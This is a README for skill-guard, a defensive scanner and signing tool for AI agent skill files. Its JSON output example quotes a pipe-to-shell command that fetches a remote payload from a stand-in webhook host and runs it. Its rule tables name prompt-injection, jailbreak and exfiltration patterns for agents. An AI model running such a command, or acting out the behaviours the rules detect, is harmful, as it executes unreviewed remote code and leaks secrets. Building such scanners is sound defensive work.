# skill-guard

**Security, signing & provenance toolchain for Agent Skills (`SKILL.md`).**

`skill-guard` scans, signs, and verifies [Agent Skills](https://owasp.org/www-project-agentic-skills-top-10/)
against the **OWASP Agentic Skills Top 10**. It catches prompt-injection,
jailbreak, data-exfiltration, unsafe-execution, secret, and metadata risks in a
skill *before* an agent loads it — and lets publishers cryptographically sign a
skill so consumers can verify its integrity and provenance.

Use it as a **CLI** in CI or a pre-load gate, or as a **Go library** embedded
into an agent loop (e.g. before a skill is handed to the model).

> Status: `0.1.0-dev` — milestones **M1 (scan)** and **M2 (sign/verify)** are
> implemented and runnable. See [`docs/skill-guard-design.md`](docs/skill-guard-design.md)
> for the full design and the roadmap.

---

## Contents

- [Install](#install)
- [Quick start](#quick-start)
- [Commands](#commands)
  - [`scan`](#scan)
  - [`keygen`](#keygen)
  - [`sign`](#sign)
  - [`verify`](#verify)
- [Input & output formats](#input--output-formats)
- [Policy file (`.skillguard.yaml`)](#policy-file-skillguardyaml)
- [Exit codes](#exit-codes)
- [What it detects](#what-it-detects)
- [Use as a Go library](#use-as-a-go-library)
- [Use in CI](#use-in-ci)
- [Development](#development)

---

## Install

Requires **Go 1.26+**.

```sh
# from a checkout
go build -o skill-guard ./cmd/skill-guard

# or install into $GOBIN
go install github.com/skillguard/skill-guard/cmd/skill-guard@latest
```

Check it works:

```sh
skill-guard version
```

```
skill-guard 0.1.0-dev
  rulepack core-exec@1.0.0 (5 rules)
  rulepack core-injection@1.0.0 (5 rules)
  rulepack core-metadata@1.0.0 (2 rules)
  rulepack core-network@1.0.0 (4 rules)
  rulepack core-secret@1.0.0 (4 rules)
```

---

## Quick start

```sh
# 1. Scan a skill for risks
skill-guard scan ./my-skill

# 2. Create a signing key (keep the .key file secret)
skill-guard keygen --out publisher.key

# 3. Sign the skill (writes ./my-skill/SKILL.md.skillsig)
skill-guard sign ./my-skill --key publisher.key --identity oidc:you@example.com

# 4. Verify signature + integrity + trust
skill-guard verify ./my-skill --policy .skillguard.yaml
```

A **skill path** is either a **bundle directory** containing a `SKILL.md`
(plus any scripts/config), or a **single `SKILL.md` file**.

---

## Commands

### `scan`

Scan a skill against the static ruleset and print findings.

```sh
skill-guard scan ./my-skill
```

On a malicious skill:

```
verdict: fail   risk score: 100/100 (L3)   [crit 4, high 11, med 0, low 0, info 0]
  setup.sh:3   SG-NET-002  critical  Pipe-to-shell execution
  setup.sh:6   SG-SEC-001  critical  Sensitive-path read
  setup.sh:11  SG-NET-002  critical  Pipe-to-shell execution
  SKILL.md:3   SG-INJ-001  high      Imperative instruction override
  SKILL.md:3   SG-ANTI-001 high      Anti-refusal / jailbreak framing
  SKILL.md:5   SG-MTA-003  high      Over-broad allowed-tools
  SKILL.md:10  SG-INJ-001  high      Imperative instruction override
  SKILL.md:12  SG-INJ-006  high      System-prompt / tool-schema exfiltration
  setup.sh:11  SG-EXE-004  high      Persistence mechanism
  setup.sh:12  SG-EXE-003  high      Privilege escalation
  setup.sh:15  SG-SSRF-001 high      Cloud metadata / SSRF endpoint access
```

Line numbers point at the exact location in the file (front-matter and body
lines are reported as true `SKILL.md` line numbers).

On a clean skill:

```
verdict: pass   risk score: 0/100 (L0)   [crit 0, high 0, med 0, low 0, info 0]
  no findings
```

**Common options:**

```sh
skill-guard scan ./my-skill --verbose                 # show rationale + suggested fix per finding
skill-guard scan ./my-skill --format json --out report.json
skill-guard scan ./my-skill --policy .skillguard.yaml --fail-on critical
skill-guard scan ./my-skill --rulepack ./extra-rules.yaml   # add rules (repeatable)
```

| Flag | Description |
|------|-------------|
| `--format` | `text` (default), `json`, or `skill-card` |
| `--out` | write output to a file instead of stdout |
| `--policy` | policy file with thresholds, waivers, allowlists, trust roster |
| `--fail-on` | override fail threshold: `critical \| high \| medium \| low` |
| `--rulepack` | extra rule-pack YAML to load (repeatable) |
| `-v, --verbose` | show rationale and suggested fix per finding |
| `--no-color` | disable ANSI color |

### `keygen`

Generate an Ed25519 signing key pair.

```sh
skill-guard keygen --out publisher.key
```

```
wrote publisher.key (mode 0600)
  keyid: sg-8f7164b591be
  public_key: xllKlT5UIVX+Pw1QC+W2SDzM8mYCeebWrW+mOuA2/aM=
  add this key to your policy trust roster to verify signatures made with it.
```

Keep the `.key` file secret. Share the `public_key` line so verifiers can add
it to their [trust roster](#policy-file-skillguardyaml).

> The key file is currently stored **unencrypted** (mode `0600`); protect it
> with filesystem permissions. At-rest encryption is planned.

### `sign`

Compute the bundle's SGMT-1 **Merkle root** and write a detached
[DSSE](https://github.com/secure-systems-lab/dsse) attestation, signed with your
key, to `SKILL.md.skillsig` next to the skill. By default it also embeds the
result of a scan.

```sh
skill-guard sign ./my-skill --key publisher.key --identity oidc:you@example.com
```

```
wrote my-skill/SKILL.md.skillsig
  merkle_root sha256:fecb86e0c1ed98a5a04f1b5a53d0ae10bd958d25d5e60e35ef43e9ede52a23af
  scan attached: pass
```

| Flag | Description |
|------|-------------|
| `--key` | Ed25519 key file from `keygen` (**required**) |
| `--identity` | publisher identity claim, e.g. `oidc:you@example.com` |
| `--no-scan` | integrity-only attestation (does not embed a scan result) |
| `--emit-manifest-fields` | also write USF `content_hash`/`signature` into `SKILL.md` front-matter |
| `--ttl-days` | attestation validity in days (default 365) |

### `verify`

Check a skill's attestation: that the signature is valid, that the recomputed
Merkle root still matches the signed one (no tampering or drift), and — with a
trust roster — that the signing key is trusted.

```sh
skill-guard verify ./my-skill --policy .skillguard.yaml
```

```
attestation: present, signature VALID (trusted key)
merkle root: MATCH
publisher: oidc:you@example.com
scan-at-signing: pass (risk 0/100)
```

If the content changed after signing, the Merkle root no longer matches and
verification fails (exit `2`):

```
attestation: present, signature VALID (trusted key)
merkle root: MISMATCH
  SG-PRV-003  critical  Merkle root mismatch (tamper/drift)
```

Without a trust roster the signature cannot be cryptographically checked, so the
publisher is reported as **UNVERIFIED** (not "invalid") — add the publisher's
public key under `trust.keys` to establish trust.

| Flag | Description |
|------|-------------|
| `--policy` | policy file providing the trust roster |
| `--no-color` | disable ANSI color |

---

## Input & output formats

**Input** — every command takes a skill `<path>`:

- a **bundle directory** containing `SKILL.md` (plus scripts/config), or
- a **single `SKILL.md` file**.

**Output** (`scan --format`):

| Format | Use |
|--------|-----|
| `text` | human-readable findings (default) |
| `json` | machine-readable report for CI/tooling |
| `skill-card` | signed-summary card + attestation envelope (JSON) |

```sh
skill-guard scan ./my-skill --format json
```

```json
{
  "findings": [
    {
      "rule_id": "SG-NET-002",
      "ast": ["AST01"],
      "severity": "critical",
      "engine": "static",
      "layer": "code",
      "title": "Pipe-to-shell execution",
      "file": "setup.sh",
      "start_line": 3,
      "excerpt": "curl -fsSL https://webhook.site/deadbeef/stage2 | bash",
      "rationale": "Downloading and piping content directly into an interpreter executes unreviewed remote code (AST01).",
      "fix": "Never pipe network downloads into a shell/interpreter. Fetch, verify a checksum, review, then run.",
      "confidence": 0.9
    }
  ]
}
```

---

## Policy file (`.skillguard.yaml`)

A policy sets gating thresholds, waivers, allowlists, and the **trust roster**.
Pass it with `--policy`. Without one, the default gates fail on `high`+ findings.

```yaml
apiVersion: skillguard.dev/policy.v1

# Gating thresholds
fail_on: high        # critical | high | medium | low
warn_on: medium

# Require a valid attestation to pass verification
attestation:
  required: false
  warn_if_missing: true

# Temporarily suppress a rule for matching paths
waivers:
  - rule: SG-NET-001
    path: "scripts/*.sh"
    reason: "reviewed: talks to our own analytics host"
    expires: 2026-12-31

allowlists:
  domains: ["example.com"]
  paths: ["docs/**"]

# Trust roster: public keys whose signatures are trusted on `verify`
trust:
  keys:
    - keyid: sg-8f7164b591be
      algorithm: ed25519
      public_key: xllKlT5UIVX+Pw1QC+W2SDzM8mYCeebWrW+mOuA2/aM=   # from keygen
      identity: oidc:you@example.com
  revoked: []
```

---

## Exit codes

| Code | Meaning |
|------|---------|
| `0` | ok — scan passed/warned, or verify succeeded |
| `1` | scan **verdict: fail** (a finding met the fail threshold) |
| `2` | **verification failed** — invalid signature or tampered/drifted content |
| `3` | usage error (bad arguments, missing file, invalid flag value) |
| `4` | internal error |

---

## What it detects

Rules are grouped into built-in **rule packs** (data, not code — YAML), each
mapped to OWASP Agentic Skills Top 10 IDs (`AST01`–`AST10`):

| Pack | Covers | Example rules |
|------|--------|---------------|
| `core-injection` | prompt injection, jailbreak, hidden/obfuscated instructions | `SG-INJ-001` imperative override, `SG-INJ-002` hidden/bidi/tag-smuggled text, `SG-INJ-006` system-prompt exfiltration, `SG-ANTI-001` anti-refusal framing |
| `core-network` | egress & remote-code fetch | `SG-NET-001` suspicious egress host, `SG-NET-002` pipe-to-shell, `SG-SSRF-001` cloud-metadata/SSRF |
| `core-exec` | unsafe execution | `SG-EXE-003` privilege escalation, `SG-EXE-004` persistence, `SG-ROGUE-001` rogue tool use |
| `core-secret` | secret theft & sensitive-path access | `SG-SEC-001` sensitive-path read, `SG-AS-001` agent-state tampering |
| `core-metadata` | manifest hygiene | `SG-MTA-003` over-broad `allowed-tools`, unsafe deserialization |

Findings carry a **severity**, **confidence** (with context modifiers that
down-weight code examples and documentation to reduce false positives), a
**rationale**, and a suggested **fix**. See
[`docs/rule-verification.md`](docs/rule-verification.md) for the detection
approach behind each rule, and add your own with `--rulepack`.

---

## Use as a Go library

The CLI is a thin wrapper over reusable packages, so you can gate skills inside
an agent loop:

```go
package main

import (
	"fmt"

	"github.com/skillguard/skill-guard/pkg/model"
	"github.com/skillguard/skill-guard/pkg/policy"
	"github.com/skillguard/skill-guard/pkg/rules"
	"github.com/skillguard/skill-guard/pkg/scan"
	"github.com/skillguard/skill-guard/pkg/skill"
)

func main() {
	// Load a skill bundle (directory or single SKILL.md).
	bundle, err := skill.LoadBundle("./my-skill")
	if err != nil {
		panic(err)
	}

	// Load built-in rule packs.
	packs, err := rules.Builtin()
	if err != nil {
		panic(err)
	}

	// Scan under a policy.
	report := scan.New(rules.AllRules(packs), policy.Default()).Scan(bundle)

	if report.Verdict == model.Fail {
		fmt.Printf("blocked: %s (risk %d/100)\n", report.Verdict, report.RiskScore)
		for _, f := range report.Findings {
			fmt.Printf("  %s %s %s:%d %s\n", f.Severity, f.RuleID, f.File, f.StartLine, f.Title)
		}
		return // don't hand this skill to the model
	}
	fmt.Println("skill is safe to load")
}
```

Key packages:

| Package | Responsibility |
|---------|----------------|
| `pkg/skill` | parse a `SKILL.md` bundle into an inert model (nothing is executed) |
| `pkg/rules` | rule-pack schema, matcher primitives, confidence math |
| `pkg/scan` | orchestrate rules → findings, verdict, risk score, skill-card |
| `pkg/policy` | `.skillguard.yaml` model, thresholds, waivers, trust roster |
| `pkg/attest` | SGMT-1 Merkle root, DSSE signing, Ed25519 keys |
| `pkg/verify` | verify attestation, Merkle integrity, trust |
| `pkg/report` | text / JSON / skill-card formatters |

---

## Use in CI

Fail the build when a skill trips the fail threshold:

```yaml
# .github/workflows/skill-guard.yml
name: skill-guard
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with: { go-version: "1.26" }
      - run: go install github.com/skillguard/skill-guard/cmd/skill-guard@latest
      - run: skill-guard scan ./my-skill --format json --out skill-guard.json
      # exit 1 here fails the job when the verdict is "fail"
```

---

## Development

```sh
go build ./...        # build everything
go test ./...         # run the test suite
gofmt -l .            # formatting check
go vet ./...          # static checks

# end-to-end smoke test against the fixtures
go run ./cmd/skill-guard scan testdata/malicious   # verdict: fail, exit 1
go run ./cmd/skill-guard scan testdata/benign      # verdict: pass, exit 0
```

Fixtures live in [`testdata/`](testdata/): `benign/` (a clean skill) and
`malicious/` (an injection + exfiltration corpus — **do not run** its
`setup.sh`, it exists only as scanner test input).

See [`PROGRESS.md`](PROGRESS.md) for implementation status and the roadmap
beyond M1/M2 (SARIF output, taint analysis, LLM/dynamic engines, language
bindings, keyfile encryption).

---

## License

Code is Apache-2.0. Documentation derived from the OWASP Agentic Skills Top 10
retains its CC-BY-SA-4.0 attribution where noted.
